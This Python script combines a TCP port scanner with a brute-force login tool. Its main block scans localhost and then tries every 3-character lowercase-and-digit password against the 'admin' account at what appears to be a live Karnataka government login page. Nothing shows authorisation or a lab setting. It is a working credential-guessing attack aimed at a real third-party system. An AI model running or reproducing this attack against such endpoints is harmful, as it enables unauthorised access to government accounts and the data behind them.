import socket
import itertools
import string
import requests

def port_scanner(target, ports):
    try:
        print(f"Scanning {target} for open ports...")
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                if sock.connect_ex((target, port)) == 0:
                    print(f"Port {port} is open")
    except (OSError, ValueError) as e:
        print(f"Error scanning ports: {e}")

def brute_force_login(url, username, password_list):
    print(f"Starting brute-force attack on {url} with username {username}")
    for password in password_list:
        try:
            response = requests.post(url, data={'username': username, 'password': password}, timeout=5)
            if response.status_code == 200 and "Invalid" not in response.text:
                print(f"Success! Password found: {password}")
                return password
        except requests.RequestException as e:
            print(f"Error during request: {e}")
    print("Brute-force attack failed: No valid password found.")

def generate_password_list(length=4):
    if not isinstance(length, int) or length <= 0:
        raise ValueError("Password length must be a positive integer.")
    chars = string.ascii_lowercase + string.digits
    return [''.join(p) for p in itertools.product(chars, repeat=length)]

if __name__ == "__main__":
    try:
        target_ip = "127.0.0.1"
        test_ports = [22, 80, 443, 3306]
        if not isinstance(target_ip, str) or not target_ip.strip():
            raise ValueError("Target IP must be a non-empty string.")
        if not all(isinstance(port, int) and 0 < port < 65536 for port in test_ports):
            raise ValueError("Ports must be valid integers between 1 and 65535.")
        port_scanner(target_ip, test_ports)
        
        target_url = "https://uucms.karnataka.gov.in/Login/Success"
        username = "admin"
        password_length = 3
        if not isinstance(target_url, str) or not target_url.startswith("http"):
            raise ValueError("Target URL must be a valid HTTP/HTTPS URL.")
        if not isinstance(username, str) or not username.strip():
            raise ValueError("Username must be a non-empty string.")
        
        passwords = generate_password_list(password_length)
        brute_force_login(target_url, username, passwords)
    except (ValueError, OSError) as e:
        print(f"Runtime error: {e}")
